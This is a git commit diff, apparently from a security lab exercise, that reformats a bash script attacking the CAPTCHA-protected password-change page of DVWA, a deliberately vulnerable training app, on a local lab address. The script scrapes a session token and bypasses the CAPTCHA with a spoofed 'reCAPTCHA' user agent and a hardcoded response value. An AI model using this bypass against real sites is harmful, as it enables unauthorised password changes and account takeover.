c9b4c7cdc7c418ff5680930a8880adbef05df760
Wiktoria Blomgren Strandberg <102546496+wikblo-0@users.noreply.github.com>
2026-05-12 16:25:35 +0200

    Refactor curl commands for better readability

--- high_security_level.sh
+++ high_security_level.sh
@@ -8,18 +8,18 @@ rm cookies.txt #removes old file with cookies
 
 #saves login cookies and login page html to local files
 curl -s -c cookies.txt \
--b "security=$SECURITY" \
-http://192.168.56.105/DVWA/login.php \
->login.html
+  -b "security=$SECURITY" \
+  http://192.168.56.105/DVWA/login.php \
+  >login.html
 
 TOKEN=$(grep -oP "name='user_token' value='\K[^']+" login.html) #saves user token variable found in login html
 PHPSESSID=$(awk '$6=="PHPSESSID" {print $7}' cookies.txt) #saves PHP session ID found in cookies
 
 #logs in using cookies and user token
 curl -s -b cookies.txt \
--b "security=$SECURITY" \
--d "username=$USER&password=$PASS&user_token=$TOKEN&Login=Login" \
-http://192.168.56.105/DVWA/login.php
+  -b "security=$SECURITY" \
+  -d "username=$USER&password=$PASS&user_token=$TOKEN&Login=Login" \
+  http://192.168.56.105/DVWA/login.php
 
 
 
@@ -32,14 +32,14 @@ echo "Current password: $PASS"
 echo "Attempting to change the password to $NEW_PASS..."
 
 RESPONSE=$(curl -s -X POST \
- -A "reCAPTCHA" \
- -b "PHPSESSID=$PHPSESSID; security=$SECURITY" \
- -d "step=1&password_new=$NEW_PASS&password_conf=$NEW_PASS&g-recaptcha-response=hidd3n_valu3&user_token=$TOKEN&Change=Change" \
-http://192.168.56.105/DVWA/vulnerabilities/captcha/)
+  -A "reCAPTCHA" \
+  -b "PHPSESSID=$PHPSESSID; security=$SECURITY" \
+  -d "step=1&password_new=$NEW_PASS&password_conf=$NEW_PASS&g-recaptcha-response=hidd3n_valu3&user_token=$TOKEN&Change=Change" \
+  http://192.168.56.105/DVWA/vulnerabilities/captcha/)
 
 if echo "$RESPONSE" | grep -q "Password Changed."; then
-    echo "Attempt result -> SUCCESS!"
+  echo "Attempt result -> SUCCESS!"
 else
-    echo "Attempt result -> FAILURE"
+  echo "Attempt result -> FAILURE"
 fi
 }> /home/kali/captcha_high.log
